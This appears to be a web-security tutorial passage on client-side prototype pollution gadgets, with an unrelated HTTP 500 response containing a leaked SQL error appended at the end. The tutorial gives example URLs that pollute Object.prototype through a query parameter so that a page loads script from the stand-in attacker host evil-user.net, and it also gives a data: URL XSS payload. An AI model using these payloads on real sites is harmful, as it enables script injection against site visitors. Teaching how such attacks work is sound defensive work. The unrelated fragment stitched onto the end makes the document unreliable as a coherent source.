
Many JavaScript libraries accept an object that developers can use to set different configuration options. The library code checks whether the developer has explicitly added certain properties to this object and, if so, adjusts the configuration accordingly. If a property that represents a particular option is not present, a predefined default option is often used instead. A simplified example may look something like this:

`let transport_url = config.transport_url || defaults.transport_url;`

Now imagine the library code uses this `transport_url` to add a script reference to the page:

``let script = document.createElement('script'); script.src = `${transport_url}/example.js`; document.body.appendChild(script);``

If the website's developers haven't set a `transport_url` property on their `config` object, this is a potential gadget. In cases where an attacker is able to pollute the global `Object.prototype` with their own `transport_url` property, this will be inherited by the `config` object and, therefore, set as the `src` for this script to a domain of the attacker's choosing.

If the prototype can be polluted via a query parameter, for example, the attacker would simply have to induce a victim to visit a specially crafted URL to cause their browser to import a malicious JavaScript file from an attacker-controlled domain:

`https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net`

By providing a `data:` URL, an attacker could also directly embed an XSS payload within the query string as follows:

`https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//`

Note that the trailing `//` in this example is simply to comment out the hardcoded `/example.js` suffix.


HTTP/2 500 Internal Server Error
Date: Thu, 17 Oct 2024 11:39:30 GMT
Content-Type: application/json
Content-Length: 345
Access-Control-Allow-Credentials: true
Vary: Origin
Cf-Cache-Status: DYNAMIC
Strict-Transport-Security: max-age=6

{"success":false,"errorMessage":"SQL [insert into \"category\" (\"company_id\", \"name\", \"is_active\", \"inform_all_representatives\", \"last_modification\", \"created_ts\", \"system_category\") values (?, ?, ?, ?, current_timestamp, current_timestamp, ?) returning \"category\".\"id\"]; ERROR: value too long for type character varying(100)"}